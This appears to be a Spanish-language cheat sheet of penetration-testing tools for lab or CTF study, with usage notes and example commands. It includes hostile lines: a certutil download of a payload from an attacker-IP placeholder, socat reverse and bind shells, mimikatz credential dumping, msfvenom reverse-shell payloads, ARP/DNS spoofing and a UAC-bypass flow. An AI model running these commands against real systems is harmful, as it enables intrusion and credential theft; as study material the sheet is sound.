# Herramientas

### `arpspoof`  
Herramienta para **envenenamiento ARP (ARP spoofing/poisoning)** en redes LAN (parte de dsniff).  
- Qué hace: envía respuestas ARP falsas para asociar la IP de la víctima o puerta de enlace a la MAC del atacante, permitiendo MiTM sobre tráfico local.  
- Uso típico en pruebas: redirigir tráfico hacia el equipo de auditoría para análisis (captura con `tcpdump`/`wireshark`) o para pruebas de detección de redes.  
- Opciones comunes: `-i <iface>` para interfaz, `-t <target>` para especificar objetivo, `-r` para inyectar en ambos sentidos (victima<>gateway).  
- Riesgos y ética: altamente intrusivo — usar **solo** en entornos autorizados; puede interrumpir comunicación y ser detectado por sistemas de defensa.  
- Ejemplos: `arpspoof -i eth0 -t <IP_TARGET> <IP_GATEWAY>`, `arpspoof -i wlan0 -t 192.168.1.5 -r 192.168.1.1`

### `autoroute`  
Script de Metasploit para **crear rutas de red a través de sesiones de Meterpreter comprometidas** (pivoting).  
- Qué hace: configura tablas de enrutamiento en Metasploit para que el tráfico hacia subredes específicas pase a través de una sesión activa de Meterpreter, permitiendo alcanzar redes internas no accesibles directamente.  
- Uso típico en pruebas: después de comprometer un host (pivote), se usa para escanear y atacar otros sistemas en subredes internas mediante módulos de Metasploit.  
- Opciones comunes: `-s` para especificar subred (CIDR notation), `-n` para máscara de red (obsoleta), `-p` para mantener ruta persistente, `list` para ver rutas activas, `delete` para eliminar rutas.  
- Riesgos y ética: permite movimiento lateral en redes autorizadas; monitorear uso ya que puede generar tráfico significativo y ser detectado por sistemas de seguridad.  
- Ejemplos: `run autoroute -s 10.1.1.0/24`, `run autoroute -s 192.168.50.0/24 -p`, `run autoroute -s 172.16.0.0/16`, `run autoroute list`, `run autoroute delete -s 10.1.1.0/24`

### `cadaver`  
Cliente WebDAV de línea de comandos, similar a un cliente FTP para servidores WebDAV.  
- Permite **navegar, listar, subir, descargar, mover y borrar** archivos y directorios en un endpoint WebDAV.  
- Útil para interacción manual y verificación de permisos (lectura/escritura).  
- Soporta autenticación básica y digest; puede pedir credenciales al conectarse.  
- Comandos comunes dentro de la sesión `cadaver`: `ls`, `cd`, `pwd`, `put archivo`, `get archivo`, `delete archivo`, `mkdir`.  
- Ejemplo de conexión: `cadaver http://target.com/webdav/` (luego autenticar si es necesario).  
- Muy usado en pentesting para probar si un servidor permite **subida de archivos** o gestión remota de ficheros.

### `certutil`
Herramienta nativa de Windows para **gestionar certificados y realizar operaciones criptográficas**.  
- Qué hace: ver/instalar/exportar certificados, codificar/decodificar (Base64), calcular hashes y —entre otras opciones— descargar recursos remotos (`-urlcache`).  
- Casos de uso legítimos, administración de CAs y certificados, ver detalles de un `.cer`, verificar la integridad de archivos mediante hashes.  
- Riesgo/abuso: su funcionalidad de descarga y codificación se ha aprovechado en ataques *Living off the Land* para traer payloads sin usar binarios externos; por eso conviene monitorizar su uso.
- Limitaciones: requiere conectividad para descargar; sus operaciones quedan registradas y pueden ser inspeccionadas por EDR/proxy.
- Ejemplos: `certutil -urlcache -f http://<IP_atacante>/<ruta_payload> <nuevo_nombre>`, `certutil -hashfile <archivo> SHA256`, `certutil -dump <certificado.cer>`

### `cupp`
- Herramienta para **generación de diccionarios de contraseñas personalizadas** basada en información del objetivo.
- Crea **wordlists dirigidas** combinando datos personales como nombre, apellidos, fechas importantes, apodos, mascotas, intereses y patrones comunes de contraseñas humanas.
- Uso típico en **auditorías de contraseñas** para preparar diccionarios más efectivos que los genéricos y utilizarlos con herramientas como `hydra`, `john`, `hashcat`, `crackmapexec` o `netexec`.
- Dispone de un **modo interactivo (`-i`)** que solicita información del objetivo y genera automáticamente múltiples combinaciones.
- Incluye mutaciones comunes con números, símbolos, años y variaciones tipo **leetspeak**, configurables desde su archivo de configuración.
- Herramienta potente y potencialmente intrusiva; usar **solo en entornos autorizados**, laboratorios o escenarios educativos.
- Ejemplo: `cupp -i`, que genera un archivo `.txt` con el diccionario resultante listo para su uso.

### `crackmapexec`  
Framework de post-explotación y enumeración para entornos Windows (CME).  
- Herramienta en Python que permite **escanear y operar a gran escala** sobre protocolos Windows: SMB, WinRM, LDAP, MSSQL, etc.  
- Ideal para **paralelizar tareas** (mismas credenciales contra múltiples hosts) y ejecutar módulos o comprobaciones automatizadas.  
- Soporta autenticación con usuario/contraseña, hashes NTLM y autenticación de dominio (`-u`, `-p`, `-H`, `-d`).  
- Permite enumeración de recursos: `--shares`, `--users`, `--pass-pol`, `--local-auth`, entre otros.  
- Dispone de un sistema de **módulos** (`-M <module>`) para tareas comunes (dump de credenciales, persistencia, recolección de información).  
- Uso típico para lateral movement, enumeración masiva y ejecución de módulos en entornos Windows autorizados.  
- Ejemplos de comandos: `crackmapexec winrm <ip> -u <user> -p <wordlist passwords>`, `crackmapexec winrm <ip> -u <user> -p <password> -x "<command>"`

### `davtest`  
Herramienta de auditoría para **probar la capacidad de subida y ejecución** en servidores WebDAV.  
- Intenta subir archivos con múltiples extensiones (`.php`, `.asp`, `.jsp`, etc.) y luego verifica si son accesibles/executables.  
- Permite detectar configuraciones inseguras que permiten subir webshells o artefactos ejecutables.  
- Soporta parámetros de autenticación para targets protegidos (`-auth user:pass`).  
- Uso típico: `davtest -url http://target.com/webdav/` y opciones adicionales para extensiones o rutas.  
- Muy útil en etapas de explotación de aplicaciones web basadas en WebDAV.

### `dig`  
Herramienta de línea de comandos para realizar consultas DNS.  
- Permite consultar registros como **A, AAAA, MX, NS, TXT, SOA, CNAME**.  
- Soporta consultas a **servidores DNS específicos** con `@servidor`.  
- Puede mostrar resultados en formato resumido (`+short`) o detallado.  
- Permite medir tiempos de respuesta y depurar problemas de DNS.  
- También se usa para probar **transferencias de zona (AXFR)** y detectar configuraciones inseguras.  

### `dirb`  
Herramienta para **fuerza bruta de directorios y archivos web**.  
- Busca rutas ocultas en servidores web usando **wordlists**.  
- Permite probar varias extensiones de archivos (`-X .php,.bak,.zip`) para encontrar backups o scripts.  
- Útil para detectar **directorios no indexados** o archivos sensibles.  
- Soporta escaneo recursivo para descubrir rutas profundas.  
- Ideal para enumeración de contenido en pruebas de penetración web.  
- En caso de analizar una página donde sea necesario login, podemos añadir la opción `-u <user>:<password>`

### `dnsdumpster.com`  
Servicio en línea para **reconocimiento DNS** de un dominio.  
- Identifica registros (A, MX, NS, TXT).  
- Descubre **subdominios** y hosts relacionados.  
- Genera posibles **mapas de red** visuales.  
- Ayuda en la enumeración inicial de infraestructura de un objetivo.  

### `dnsenum`  
Herramienta en Perl para **enumeración DNS** automatizada.  
- Obtiene registros DNS (A, MX, NS, TXT).  
- Intenta realizar **transferencias de zona (AXFR)**.  
- Usa diccionarios para descubrir **subdominios ocultos**.  
- Puede buscar rangos de IP relacionados con el dominio.  
- Integra búsquedas inversas para encontrar hosts asociados.  

### `dnsrecon`  
Herramienta avanzada de **reconocimiento DNS** en Python.  
- Enumera registros comunes y especiales (A, AAAA, MX, SOA, PTR, TXT).  
- Realiza **zonetransfer tests (AXFR)** para encontrar fugas de datos.  
- Permite **fuerza bruta de subdominios** con diccionarios.  
- Realiza consultas inversas para identificar hosts por IP.  
- Exporta resultados en múltiples formatos (CSV, JSON, XML).  

### `dnsspoof`  
Herramienta para **suplantación/poisoning de respuestas DNS** en una red local (paquete dsniff).  
- Qué hace: intercepta consultas DNS en la LAN y responde con IPs falsas según un fichero de hosts para redirigir tráfico.  
- Uso en laboratorio: simular ataques de MiTM, pruebas de detección IDS/EDR o enseñar riesgos de DNS inseguro.  
- Requisitos: estar en la misma red/broadcast domain y, normalmente, ARP-spoofing activo para capturar tráfico objetivo; puede especificarse interfaz con `-i`.  
- Ética/seguridad: solo en entornos controlados y autorizados; su uso en redes ajenas es ilegal.  
- Ejemplos: `dnsspoof -i eth0 -f hosts.txt`, `echo "target.com <IP>" > hosts.txt && dnsspoof -i wlan0 -f hosts.txt`

### `enum4linux`  
Herramienta en Perl para **enumeración y recolección de información de SMB/Windows** desde Linux.  
- Realiza consultas a servicios SMB/NetBIOS para obtener usuarios, shares, políticas y versiones.  
- Puede ejecutar: enumeración de usuarios (`-U`), listas de shares (`-S`), recopilación de información sobre el dominio y el host (`-a` para todo).  
- Soporta intentos de autenticación nulos (null sessions) y consultas que aprovechan servicios expuestos sin credenciales.  
- Útil para auditorías de red internas y reconocimiento en entornos Windows desde una máquina Linux.  
- Limitaciones: depende de que SMB esté accesible y a menudo requiere permisos para ciertas operaciones; puede ser ruidosa en la red.  
- Ejemplos de uso: `enum4linux -a target.example.com`, `enum4linux -U target.example.com`, `enum4linux -S target.example.com`

### `evil-winrm`  
Cliente de WinRM para **obtener shells remotos** en máquinas Windows (PowerShell interactivo).  
- Proporciona un prompt de PowerShell contra el servicio **WinRM** usando credenciales válidas o hashes NTLM.  
- Permite **subida/descarga de archivos**, ejecución de comandos, y ejecución de scripts PowerShell localmente.  
- Soporta autenticación por contraseña, hash NTLM (`-H`), Kerberos (con configuración adicional) y SSL (`-S`).  
- Opciones habituales: `-i` IP/host, `-u` usuario, `-p` contraseña, `-H` hash NTLM, `-P` puerto, `-s` ruta de scripts locales, `-l` para log.  
- Muy usado en fases de post-explotación y lateral movement cuando WinRM está habilitado en la red objetivo.  
- Ejemplos de uso: `evil-winrm -u <user> -p <password> -i <ip>`

### `exiftool`
Herramienta para **leer, escribir y manipular metadatos** en archivos (imágenes, documentos, videos).
- Compatible con EXIF, IPTC, XMP, PDF, PNG, JPG, TIFF, MP4 y muchos más.
- Útil para extracción de información oculta (metadatos GPS, cámaras, software usado).
- Permite modificar o borrar metadatos de forma precisa.
- Muy usado en **forense digital**, OSINT y análisis de imágenes.
- Ejemplos: `exiftool archivo.jpg`, `exiftool -gps* archivo.jpg`, `exiftool -All= archivo.jpg` (elimina metadatos), `exiftool -Comment="Texto" archivo.jpg`

### `fcrackzip`
Herramienta para **recuperar contraseñas de archivos ZIP protegidos**.
- Permite ataques de fuerza bruta, diccionario y basado en máscaras.
- Compatible con ZIP cifrados con métodos clásicos.
- Puede probar múltiples hilos para acelerar ataques.
- Ejemplos: `fcrackzip -b -c a1 -l 1-6 archivo.zip`, `fcrackzip -D -p rockyou.txt archivo.zip`, `fcrackzip -v -u -D -p wordlist.txt archivo.zip`

### `fierce`  
Herramienta en Perl enfocada en **descubrir hosts y subdominios**.  
- Localiza subdominios mediante **wordlists**.  
- Detecta configuraciones incorrectas de DNS (AXFR).  
- Busca **rangos de IP asociados** a un dominio.  
- Intenta localizar hosts internos expuestos.  
- Muy usada en la fase de **reconocimiento pasivo y activo** en pentesting.  

### `fping`
Herramienta rápida para **sondear múltiples hosts mediante ICMP Echo (ping)** — ideal para descubrimiento masivo.  
- Envía pings **en paralelo** a muchos hosts (más rápido que `ping` uno a uno).  
- Soporta sondas por **host único, lista, rango y redes (CIDR)**: `fping 192.168.1.1`, `fping -g 192.168.1.0/24`, `fping -f hosts.txt`.
- Ideal para **descubrimiento por redes o listas grandes** en auditorías internas; salida fácil de parsear para scripts.  
- Limitaciones: depende de **ICMP** (firewalls pueden bloquearlo); no reemplaza escaneo de puertos (`nmap`).  

### `gobuster`
Herramienta rápida para enumerar **directorios, archivos y subdominios** mediante fuerza bruta con wordlists.  
- Usa peticiones HTTP de alta velocidad para descubrir **rutas ocultas que no aparecen en el sitio**.  
- Permite modo de enumeración **DNS y VHOST**, útil para encontrar subdominios no públicos.  
- Admite **filtros de extensiones** para enfocar la búsqueda en tipos específicos de archivos.  
- Puede excluir **códigos HTTP irrelevantes** para reducir ruido en los resultados.  
- Ideal para **reconocimiento inicial** en aplicaciones web antes de pruebas más profundas.  
- Ejemplo: `gobuster dir -u http://target.com -w common.txt -x php,txt` ; `gobuster dns -d dominio.com -w subdomains.txt`  

### `httrack`  
Herramienta para **descargar o hacer mirror de sitios web**.  
- Crea una copia local completa de un sitio accesible públicamente.  
- Descarga páginas HTML, imágenes, scripts y archivos referenciados.  
- Permite inspeccionar archivos **no visibles en la navegación normal**.  
- Útil para análisis offline o descubrimiento de archivos ocultos.  
- Puede ser configurada para seguir enlaces recursivamente y respetar reglas de robots.txt. 

### `hydra`  
Herramienta de fuerza bruta paralela para servicios de red y autenticación.  
- Soporta multitud de protocolos y módulos (`ssh`, `ftp`, `smtp`, `http-get`, `http-post-form`, `http-form-post`, `rdp`, `smb`, `mysql`, `postgresql`, entre otros).  
- Permite usar un usuario fijo o listas de usuarios y contraseñas (`-l`, `-L`, `-p`, `-P`).  
- Alto grado de paralelismo y control de hilos (`-t`) para ajustar velocidad/threads.  
- Opciones para salida y control: `-o` (archivo de resultados), `-V` (verbose), `-f` (terminar al encontrar credenciales), `-s` (puerto), `-S` (SSL/TLS).  
- Útil en auditorías de contraseñas y pruebas de acceso autorizado; no adecuado para flujos que requieren CSRF dinámico o tokens por sesión sin preprocesamiento.  
- Ejemplos de uso:  
  - `hydra -l <user> -P <wordlist password> <IP> http-get /`  
  - `hydra -L <wordlist user> -p <password> -t 8 -f ssh://<IP>`  
  - `hydra -l <user> -P <wordlist passwor> target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"`  
  - `hydra -l <user> -p <password> -s <service's port> -t 4 -o hydra_out.txt ssh://<IP>`  


### `incognito`  
Plugin de Meterpreter para listar, robar e impersonar *access tokens* en Windows.  
- Comandos principales: `load incognito`, `list_tokens -u`, `steal_token <proc|user>`, `impersonate_token <token>`, `revert_to_self`.  
- Permite ejecutar acciones con los permisos de otro usuario sin contraseña (útil para escalar privilegios).  
- Limitaciones: requiere tokens accesibles en memoria y permisos (p. ej. `SeDebugPrivilege`); puede ser detectado por EDR.

### `john (John the Ripper)`  
Herramienta para auditoría y recuperación de contraseñas en entornos autorizados.  
- Prueba hashes (p. ej. `/etc/shadow`) con diccionarios, reglas, máscaras e incremental para encontrar contraseñas.  
- Formatos soportados: md5crypt, sha256crypt, sha512crypt (`$6$`), bcrypt/2y, NT, Kerberos, LDAP y muchos más (Jumbo añade aún más).  
- Modos de ataque: diccionario + reglas, máscaras (pattern-based), incremental (fuerza bruta optimizada) y ataques combinados.   
- Herramientas de extracción (tipo *\*2john*): utilidades para convertir formatos/proveedores a hashes que John entiende — p. ej. `pdf2john`, `zip2john`, `rar2john`, `ssh2john`, `pfx2john`.   
- Ejemplos: `john --format=<format> --wordlist=<wordlist> --rules <archivo>`, `john --mask='?u?l?l?l?l?d?d' <archivo>`


### `kiwi`  
`kiwi` es una extensión/módulo de **Meterpreter (Metasploit)** que expone funciones similares a Mimikatz desde una sesión Meterpreter.  
- Permite ejecutar rutinas tipo Mimikatz desde una sesión Meterpreter sin tener que subir el binario `mimikatz.exe` por separado.  
- Ofrece operaciones sobre credenciales, tickets Kerberos y manipulaciones de LSA/Kerberos integradas en el contexto de Meterpreter.  
- Ventajas: integración con Metasploit (gestión de sesiones, handlers y módulos post-explotación), ejecución en memoria y flujo más directo dentro de una sesión activa.  
- Limitaciones: requiere una sesión Meterpreter activa y permisos adecuados; puede ser detectado por soluciones de seguridad.  
- Ejemplos de uso dentro de una sesión Meterpreter: `meterpreter > load kiwi`, `meterpreter > kiwi_cmd` (invocar comandos/funciones disponibles de kiwi), `meterpreter > help` (ver comandos cargados tras `load kiwi`)

### `knock`  
Herramienta cliente para **port knocking**, técnica que permite abrir puertos protegidos en un servidor tras enviar una **secuencia específica de conexiones a puertos**.
- Envía intentos de conexión (TCP/UDP) a una serie de puertos en un orden definido, sin establecer sesiones reales.
- Se utiliza junto a servicios como `knockd` o `fwknop` que monitorean la secuencia y aplican reglas de firewall dinámicas.
- Permite **ocultar servicios críticos** (como SSH) frente a escaneos (`nmap`, `masscan`) y reducir ataques de fuerza bruta.
- Puede trabajar sobre TCP (por defecto) o UDP (`-u`) y ajustar el tiempo entre knocks (`-d`).
- Muy común en **CTFs, DockerLabs y laboratorios** donde todos los puertos aparecen filtrados hasta realizar el knocking correcto.
- Ejemplo: `knock <IP_objetivo> 7000 8000 9000`

### `mimikatz`  
Herramienta (Windows .exe) para **extracción y manipulación de credenciales/local security authority** en sistemas Windows.  
- Permite interactuar con componentes de seguridad de Windows: LSA, Kerberos, NTLM, tickets, certificados y hashes.  
- Funcionalidades comunes: extraer contraseñas en texto claro, volcar hashes/kerberos tickets, manipular tickets (Golden/Pass-the-Ticket), y operaciones de privilegios.  
- Riesgo/uso: ampliamente usada en post-explotación / red team y por atacantes; debe usarse únicamente en entornos autorizados y controlados.  
- Requisitos: privilegios elevados o acceso a memoria del proceso de lsass.exe para ciertas operaciones; puede ser detectado por EDR/AV.  
- Ejemplos de comandos: `mimikatz.exe "privilege::debug"`, `"sekurlsa::logonpasswords"`, `mimikatz.exe "kerberos::ptc /export"`, `mimikatz.exe "lsadump::sam"`, `mimikatz.exe "crypto::certificates"`

### `msfvenom`
Herramienta de Metasploit para **generar payloads** en múltiples formatos (PE, DLL, scripts, etc.) usada en pruebas de penetración en entornos controlados.  
- Combina un payload (identificador) con parámetros (LHOST/LPORT, encoder, formato) y produce un artefacto que, si se ejecuta en un host objetivo, realiza la acción programada por ese payload (en laboratorio: abrir una sesión reversa, bind shell, etc.).  
- Estructura de payload identifiers: `<platform>[/<arch>]/<family>[/<transport>]` (ej.: `windows/meterpreter/reverse_tcp`, `windows/x64/meterpreter/reverse_tcp`).  
- Tipos / variantes: meterpreter (post-explotación avanzada), shells básicos (cmd), transportes (reverse_tcp, reverse_https), staged vs stageless; formatos de salida: `exe`, `dll`, `ps1`, `raw`, `elf`, etc.  
- Ética y seguridad: **solo** usar en VMs/labs autorizados; compartir artifacts o utilizarlos fuera de ese scope puede ser ilegal.
- Ejemplos: `msfvenom -p <meterpreter> LHOST=<ip_atacante> LPORT=<puerto> -f <extensión> > <nombre_archivo>`

### `nbtscan`  
Herramienta para **escanear redes buscando nombres NetBIOS (hosts Windows/SMB)**.  
- Qué hace: envía consultas NetBIOS sobre una red para enumerar equipos, nombres y direcciones IP.  
- Uso típico: descubrimiento rápido de hosts Windows y equipos que exponen NetBIOS/SMB en redes locales.  
- Limitaciones: depende de que NetBIOS esté habilitado; ineficaz a través de routers/NAT sin soporte NetBIOS; puede producir falsos positivos por hosts con múltiples nombres.  
- Salida fácil de parsear para scripts; suele usarse en auditorías internas y reconocimiento inicial.  
- Ejemplos: `nbtscan -r <IP_MASK>/24`, `nbtscan -v <IP_MASK>/24`

### `netcraft.com`  
Servicio en línea de **reconocimiento de infraestructura web**.  
- Identifica el **sistema operativo** del servidor.  
- Detecta **tecnologías** usadas (CMS, frameworks, servidores).  
- Obtiene datos de **hosting y proveedor de servicios**.  
- Muestra información sobre **certificados SSL/TLS**.  
- Puede dar detalles históricos del dominio (tecnologías pasadas, hosting previo).  

### `netdiscover`  
Herramienta de descubrimiento de red basada en ARP.  
- Detecta **hosts activos en la red local** sin necesidad de ping.  
- Útil en redes donde el **ICMP está bloqueado**.  
- Permite identificar **direcciones IP, MAC y fabricantes** de los dispositivos.  
- Puede ejecutarse en modo pasivo (escucha ARP) o activo (envía ARP requests).  
- Ideal para auditorías rápidas de redes WiFi o LAN.  

### `netexec`  
Framework de post-explotación y **auditoría de servicios remotos** (sucesor de CrackMapExec) orientado a entornos Windows, Linux y protocolos corporativos.  
- Permite autenticación contra múltiples **protocolos**: SMB, WinRM, SSH, RDP, MSSQL, LDAP, FTP, entre otros, facilitando pruebas a gran escala.  
- Soporta credenciales en texto claro, hashes NTLM, Kerberos, claves SSH y combinaciones para validación de acceso autorizado.  
- Incluye **módulos** para enumeración, consulta de políticas, identificación de configuraciones débiles, recolección de información y ejecución remota (según protocolo permitido).  
- Muy útil para tareas de **movimiento lateral, auditoría de credenciales, inventario de servicios y validación de accesos** dentro de entornos controlados.  
- Ofrece salidas parseables para integrarlo en pipelines o análisis automatizados; sucesor activo de CME con mejoras constantes.  
- Ejemplos: `netexec smb <IP_target> -u <user> -p <password>`, `netexec ssh <IP_target> -u <user> -p <password>`, `netexec smb <IP_target> -u <user> -H <NTLM_hash>`, `netexec smb <IP_target> -u <user> -P <password_wordlist.txt>`  

### `nikto`  
Escáner de vulnerabilidades web que revisa **configuraciones inseguras, archivos sensibles y versiones obsoletas** en servidores HTTP/HTTPS.  
- Realiza miles de **pruebas conocidas** para detectar fallas típicas en servidores web.  
- Identifica **archivos expuestos y directorios inseguros** que podrían filtrar información.  
- Analiza **banners, módulos y versiones** para encontrar software vulnerable.  
- Detecta **configuraciones erróneas** en Apache, Nginx, IIS y otros servidores.  
- Es ruidoso y detectable, pero muy útil para **auditorías rápidas y completas**.  
- Ejemplo: `nikto -h http://target.com` ; `nikto -h https://10.0.0.5 -p 443 -Tuning x6`  

### `nmap`  
Herramienta avanzada de **escaneo de red y seguridad**.  
- Permite descubrir **hosts activos** en un rango de IP.  
- Detecta **puertos abiertos, servicios y versiones** en ejecución.  
- Puede identificar el **sistema operativo y tipo de dispositivo**.  
- Incluye scripts (NSE – Nmap Scripting Engine) para **detección de vulnerabilidades**.  
- Soporta múltiples tipos de escaneo: TCP SYN, UDP, ICMP, entre otros.  
- La opción `-Pn` **omite el ping inicial** y fuerza el escaneo de puertos incluso si el host no responde a ICMP (útil en Windows o redes que bloquean ping).  

### `nmblookup`  
Cliente para **consultas NetBIOS name service** (parte de Samba).  
- Qué hace: resuelve nombres NetBIOS a direcciones IP y consulta registros NBNS/WINS específicos.  
- Útil para verificar resolución NetBIOS, consultar nombres específicos (`-A` para dirección invertida) y probar servidores WINS.  
- Soporta interrogaciones puntuales (`name`, `GROUP`) y puede usarse para hacer consultas a NBNS en un host concreto con `-U`/`-R` según versión.  
- Limitaciones: requiere que NetBIOS/NBNS esté disponible en la red; menos útil en redes modernas que usan solo DNS.  
- Ejemplos: `nmblookup -A <IP>`, `nmblookup 'WORKGROUP<1>' <IP>`

### `portfwd`  
Comando de Meterpreter para **reenvío de puertos locales a través de sesiones comprometidas** (port forwarding).  
- Qué hace: redirige conexiones entrantes en un puerto local de la máquina atacante a un puerto específico en un sistema objetivo accesible desde el host comprometido, creando túneles para herramientas externas.  
- Uso típico en pruebas: permitir que herramientas como Nmap, navegadores web o otros scanners accedan a servicios en redes internas a través de un pivote, cuando `autoroute` solo funciona para módulos de Metasploit.  
- Comandos comunes: `add` para crear reenvío, `-l` para puerto local, `-p` para puerto remoto, `-r` para IP remota, `list` para ver reenvíos activos, `delete` para eliminar reenvíos.  
- Limitaciones: requiere sesión Meterpreter activa; el tráfico pasa por el controlador de Metasploit; no es tan eficiente como `socks4a`/`proxychains` para múltiples conexiones.  
- Ejemplos: `portfwd add -l 8080 -p 80 -r 192.168.1.100`, `portfwd add -l 443 -p 443 -r 10.0.0.15`, `portfwd list`, `portfwd delete -l 8080 -p 80 -r 192.168.1.100`

### `scp`  
`scp` (secure copy) para **copiar archivos/dir de forma segura sobre SSH**.  
- Qué hace: transfiere ficheros entre máquina local y remota (o entre dos remotas) usando el canal cifrado de SSH.  
- Uso típico: subir backups, descargar logs, transferir binarios de forma segura entre servidores y estaciones de trabajo.  
- Opciones útiles: `-r` (recursivo para directorios), `-P` (puerto SSH), `-C` (comprimir durante transferencia), `-p` (preservar permisos/timestamp), `-v` (verbose).  
- Limitaciones: rendimiento comparado con `rsync` para sincronizaciones; negocia autenticación SSH (clave/contraseña) y depende de SSH activo en el destino.  
- Ejemplos: `scp -P 2222 -C archivo.zip usuario@<IP>:/home/usuario/, scp -r proyecto/ user@host:/var/www/`

### `smbmap`  
Herramienta para **enumeración y acceso a recursos SMB/Windows** desde Linux, pensada para realizar auditorías de permisos en shares de red.  
- Lista **shares** disponibles en un host o dominio, muestra **permisos (lectura/escritura)** por share y permite interactuar con archivos (lectura, búsqueda y —en muchas instalaciones— descarga/subida).  
- Comprueba qué recursos compartidos están accesibles con unas credenciales dadas o con sesión anónima, y evaluar si se pueden extraer datos sensibles desde esos shares.  
- Soporta usuario/contraseña, dominio y autenticación nula (null session). Se suele pasar `-H <host>` o `--target <host>`, `-u <user>`, `-p <pass>` y opcionalmente `-d <domain>`.  
- Funcionalidades importantes: enumerar shares, mostrar permisos, listar contenido de un share, buscar archivos por patrón/regex dentro de los shares para localizar secretos (contraseñas, backups, keys), etc.
- Ejemplos: `smbmap -H <IP> -u <user> -p <password>`, `smbmap -H <IP> -u '' -p ''`, `smbmap -H <IP> -u <user> -p <password> -r 'password|backup|id_rsa'` (busca archivos cuyo nombre coincida con el patrón dentro de los shares accesibles)

### `snmpwalk`  
Herramienta que realiza una **recorrida (walk) por la MIB via SNMP** para listar valores de OIDs.  
- Qué hace: consulta recursivamente OIDs partiendo de una raíz especificada y muestra valores legibles (interfaces, tablas, contadores).  
- Uso legítimo: monitorización, inventario de hardware, ver estados de interfaces, tablas ARP, información de uptime y versión de SNMP en equipos gestionados.  
- Soporta versiones SNMP v1/v2c/v3 (seguridad avanzada en v3: usuario/clave/privacidad).  
- Riesgos: si SNMP community strings son débiles (`public`/`private`) puede filtrar información sensible; atención en redes ajenas.  
- Ejemplos: `snmpwalk -v2c -c public <IP>`, `snmpwalk -v3 -u user -A authpass -X privpass <IP>`

### `socat`

Herramienta multipropósito que permite crear, redirigir y manipular conexiones entre dos endpoints utilizando distintos protocolos y tipos de sockets.

- Permite establecer conexiones TCP, UDP y UNIX sockets para comunicar procesos entre máquinas o dentro del mismo sistema.
- Puede abrir un puerto en modo escucha y ejecutar un comando cuando un cliente se conecta, ideal para pruebas o shells.
- Facilita la creación de reverse shells y bind shells estables cuando netcat no está disponible o carece de ciertas opciones.
- Permite tunelar puertos locales hacia destinos remotos, útil para pivoting y acceso a servicios internos durante un pentest.
- Puede exponer sockets internos del sistema (UNIX sockets) como puertos TCP accesibles desde la red.
- Soporta conexiones cifradas con SSL/TLS para asegurar el tráfico entre ambos extremos sin configuración compleja.
- Capaz de traducir entre protocolos o tipos de sockets distintos, actuando como puente flexible entre servicios.
- Funciona como alternativa más avanzada que netcat para depurar servicios, redirigir tráfico y realizar pruebas de red complejas.
- Ejemplos: `socat TCP:IP_target:PORT EXEC:/bin/sh` · `socat TCP-LISTEN:PORT,fork EXEC:/bin/sh` · `socat TCP-LISTEN:LOCAL_PORT,fork TCP:IP_target:REMOTE_PORT` · `socat OPENSSL:IP_target:PORT STDOUT`

### `sqlmap`  
Herramienta automatizada para **detección y explotación de vulnerabilidades de SQL Injection**.  
- Qué hace: identifica y explota inyecciones SQL en parámetros **GET, POST, cookies y headers**, permitiendo extraer bases de datos, tablas, usuarios y, en ciertos casos, ejecutar comandos en el sistema.  
- Soporta múltiples motores de bases de datos: **MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite**, entre otros.  
- Técnicas soportadas: **boolean-based blind, error-based, time-based blind, UNION-based, stacked queries**.  
- Permite enumeración completa: bases de datos (`--dbs`), tablas (`--tables`), columnas (`--columns`), volcado de datos (`--dump`).  
- Puede evadir defensas básicas usando **tamper scripts**, cambio de user-agent y control de riesgo/nivel (`--tamper`, `--random-agent`, `--risk`, `--level`).  
- Uso típico en pentesting web: validar si un input es vulnerable, automatizar explotación de SQLi y demostrar impacto de forma controlada.  
- Riesgos y ética: herramienta **muy intrusiva y ruidosa**; usar **solo** en laboratorios o entornos explícitamente autorizados.  
- Ejemplos: `sqlmap -u "http://target.com/page.php?id=1" --dbs`, `sqlmap -u "http://target.com/login.php" --forms --batch -db`, `sqlmap -u "http://target.com/item.php?id=5" --tables -D database_name`, `sqlmap -r request.txt --dump`


### `steghide`
Herramienta para **ocultar y extraer datos** dentro de archivos (steganografía).
- Soporta formatos: JPEG, BMP, WAV, AU.
- Permite incrustar ficheros usando **clave/passphrase**.
- Usa compresión y cifrado para proteger el contenido.
- Ideal para prácticas de esteganografía clásica.
- Ejemplos: `steghide embed -cf imagen.jpg -ef secreto.txt`, `steghide extract -sf imagen.jpg`

### `stegseek`
Herramienta ultrarrápida para **crackear contraseñas** usadas por *steghide*.
- Implementación moderna y optimizada (usa wordlists).
- Encuentra la passphrase y extrae el contenido en segundos.
- Ideal para CTFs, análisis forense y auditorías.
- Ejemplos: `stegseek imagen.jpg`, `stegseek imagen.jpg wordlist.txt`, `stegseek imagen.jpg rockyou.txt --extract`

### `sublist3r`  
Herramienta en Python para **enumerar subdominios**.  
- Usa motores de búsqueda (Google, Bing, Yahoo, Baidu, Ask).  
- Integra fuentes públicas como VirusTotal y Netcraft.  
- Puede trabajar con wordlists para fuerza bruta.  
- Resultados exportables en archivos de texto.  
- Ideal para descubrir subdominios rápidamente usando **OSINT**.  

### `theHarvester`  
Herramienta de recolección de información mediante **OSINT**.  
- Obtiene **correos electrónicos** relacionados con el dominio.  
- Extrae nombres de empleados desde fuentes públicas.  
- Descubre subdominios, hosts y puertos abiertos.  
- Se integra con buscadores, PGP servers, y redes sociales.  
- Muy útil en la fase de **footprinting** de un objetivo.  

### `UACMe`  
Colección de PoCs/métodos para bypass de UAC (educativo).  
- Contiene métodos numerados (p. ej. `23`) que explotan DLL hijack, COM, IFileOperation, etc., para ejecutar payloads en integridad alta.  
- Flujo típico: generar `backdoor.exe` (`msfvenom`), subir `Akagi64.exe` + `backdoor.exe`, ejecutar `Akagi64.exe <método> <ruta_backdoor>`.  
- Resultado: si funciona, el payload se ejecuta elevado (o se obtiene token elevado) y el handler recibe una sesión con mayores privilegios.  
- Advertencia: solo en entornos autorizados; puede causar inestabilidad y desencadenar detecciones de seguridad.

### `wafw00f`  
Herramienta para detectar **Web Application Firewalls (WAF)**.  
- Identifica si un sitio web tiene un WAF activo.  
- Reconoce el **tipo y fabricante** del WAF (Cloudflare, F5, Akamai, etc.).  
- Permite ajustar ataques posteriores según el firewall encontrado.  
- Útil para planear pruebas de penetración web más efectivas.  

### `whatis`  
Herramienta de Linux para **documentación rápida de comandos**.  
- Muestra una breve descripción de un comando.  
- Sirve como acceso rápido al **manual del sistema**.  
